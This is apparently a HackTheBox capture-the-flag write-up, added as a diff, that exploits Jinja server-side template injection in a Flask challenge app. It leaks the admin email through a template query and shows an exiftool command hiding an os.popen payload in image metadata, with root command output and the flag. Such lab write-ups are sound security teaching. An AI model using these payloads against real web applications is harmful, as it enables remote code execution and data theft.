@@ -1,0 +1,41 @@
+
+First Steps:
+The challenge first greets you with a generic template page, a simple placeholder populating a mostly empty site. In the navbar on top, you’ll immediately notice buttons labeled Login and Sign-UP. We’ve got to sign up to use the service, so that’s where we’ll head. Plugging in any random email and a basic username/password combination, then logging in with it, we find ourselves at a page where we’re given the option to upload an image for verification, to be sent to our “guild-master.” This’ll come into play later. Upload any random image for now, and we’ll begin our user session. “Dashboard” takes us to the same page as earlier, and ”Logout” is pretty self-explanatory, so we’ll dive into the “Profile” section, where the seed of our exploit is first planted.
+
+
+Fun with Jinja — SSTI on the Flask server
+Here’s where things get interesting. The Profile tab lets us write a biography for our user, that we can then publish, giving us a link we can share with all our friends. However, this published profile is susceptible to a Server-Side Template Injection vulnerability through its backend, the Jinja web template engine.
+
+{{7+7}}
+
+We can then generate a custom link for our username.
+
+
+Going to this same link, we’ll see our template injection rendered as intended!
+ 14
+
+From here, even with sanitization, we can find a work-around to still have our injection rendered.
+
+By specially crafting the right template string, we can get Jinja to make queries on our behalf for things we shouldn’t be able to access, like the randomly generated email used for the admin account. Here, we’ll do exactly that. Thankfully, HackTheBox lovingly provides us the code for this particular server, so we don’t have to do the injection blind. Looking through its database structure (visible in models.py), we can craft the following injection string to get the admin account’s email address:
+
+{{ User.query.filter(User.username=="admin").first().email }}
+
+Placing this string in the textbox presented, and accessing the link we’re given for our profile, we can see that the admin email account appears:
+
+
+7247784e6a78414b@master.guild
+
+password: false
+
+
+Lets use the image 
+
+
+exiftool -overwrite_original -Artist='{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' payload.jpg
+
+Verified! uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+exiftool -overwrite_original -Artist='{{ config.__class__.__init__.__globals__["os"].popen("cat flag.txt").read() }}' payload.jpg
+
+Verified! HTB{mult1pl3_lo0p5_mult1pl3_h0les_778e3bd2028b9671d048fd55e92440ad}
